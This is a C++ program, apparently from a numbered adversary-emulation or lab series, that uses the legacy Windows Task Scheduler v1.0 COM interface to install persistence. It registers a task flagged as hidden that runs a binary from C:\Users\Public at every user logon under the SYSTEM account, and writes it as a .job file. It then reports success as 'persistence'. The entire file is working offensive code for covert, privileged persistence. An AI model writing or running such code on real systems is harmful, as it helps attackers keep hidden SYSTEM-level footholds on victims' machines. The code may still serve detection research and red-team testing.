#define _WIN32_DCOM
#include <windows.h>
#include <initguid.h>
#include <mstask.h> // Legacy Task Scheduler v1.0 Header
#include <iostream>
#include <comdef.h>

// Link with the required Ole32 and UUID libraries
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "taskschd.lib")

int main()
{
    HRESULT hr = S_OK;

    // 1. Initialize the COM library
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        std::clog << "[-] CoInitializeEx failed: 0x" << std::hex << hr << std::endl;
        return 1;
    }

    // 2. Instantiate the Legacy Task Scheduler Object (v1.0)
    ITaskScheduler *pScheduler = NULL;
    hr = CoCreateInstance(
        CLSID_CTaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskScheduler,
        (void **)&pScheduler);

    if (FAILED(hr))
    {
        std::clog << "[-] Failed to instantiate legacy ITaskScheduler: 0x" << std::hex << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    // Clean up any stale legacy task file if it already exists
    pScheduler->Delete(L"A06_3c_COM_API_Task");

    // 3. Create a New Legacy Task Object Instance
    ITask *pTask = NULL;
    hr = pScheduler->NewWorkItem(
        L"A06_3c_COM_API_Task", // Task Name (This creates "A06_3c_COM_API_Task.job")
        CLSID_CTask,          // Class identifier for a standard Task
        IID_ITask,            // Interface identifier
        (IUnknown **)&pTask   // Output pointer
    );

    if (FAILED(hr))
    {
        std::clog << "[-] NewWorkItem allocation failed: 0x" << std::hex << hr << std::endl;
        pScheduler->Release();
        CoUninitialize();
        return 1;
    }

    // 4. Set the Target Binary Application Path (Using a mock path matching your upcoming SampleApp)
    hr = pTask->SetApplicationName(L"C:\\Users\\Public\\A06_3c_SampleApp.exe");
    if (FAILED(hr))
    {
        std::clog << "[-] Failed to assign application payload path: 0x" << std::hex << hr << std::endl;
        pTask->Release();
        pScheduler->Release();
        CoUninitialize();
        return 1;
    }

    // 5. Configure Task Parameters (Make it run silently)
    pTask->SetFlags(TASK_FLAG_HIDDEN); // Legacy stealth bit matching modern hidden flag

    // 6. Establish a Trigger (Let's make it execute at User Logon)
    ITaskTrigger *pTaskTrigger = NULL;
    WORD triggerIndex = 0;
    hr = pTask->CreateTrigger(&triggerIndex, &pTaskTrigger);
    if (SUCCEEDED(hr))
    {
        TASK_TRIGGER triggerDetails;
        ZeroMemory(&triggerDetails, sizeof(TASK_TRIGGER));

        triggerDetails.cbTriggerSize = sizeof(TASK_TRIGGER);
        triggerDetails.TriggerType = TASK_EVENT_TRIGGER_AT_LOGON; // Fired natively upon user session initialization

        hr = pTaskTrigger->SetTrigger(&triggerDetails);
        pTaskTrigger->Release();
    }

    // 7. Configure Account Context Credentials
    // Passing empty strings for both user and password implicitly assigns the execution context
    // to the local SYSTEM account context natively.
    hr = pTask->SetAccountInformation(L"", NULL);
    if (FAILED(hr))
    {
        std::clog << "[-] Failed to set execution credentials: 0x" << std::hex << hr << std::endl;
    }

    // 8. Commit (Serialize) the Task Object directly to Disk
    IPersistFile *pPersistFile = NULL;
    hr = pTask->QueryInterface(IID_IPersistFile, (void **)&pPersistFile);
    if (SUCCEEDED(hr))
    {
        // This line physically serializes and saves the .job structure straight into C:\Windows\Tasks\
        hr = pPersistFile->Save(NULL, TRUE);
        pPersistFile->Release();
    }

    if (SUCCEEDED(hr))
    {
        std::cout << "[+] Successfully registered legacy binary-serialized task persistence!" << std::endl;
        std::cout << "[*] Verification file created at: C:\\Windows\\Tasks\\A06_3c_COM_API_Task.job" << std::endl;
    }
    else
    {
        std::clog << "[-] Failed to save and serialize the legacy task: 0x" << std::hex << hr << std::endl;
    }

    // Clean up references
    pTask->Release();
    pScheduler->Release();
    CoUninitialize();
    return 0;
}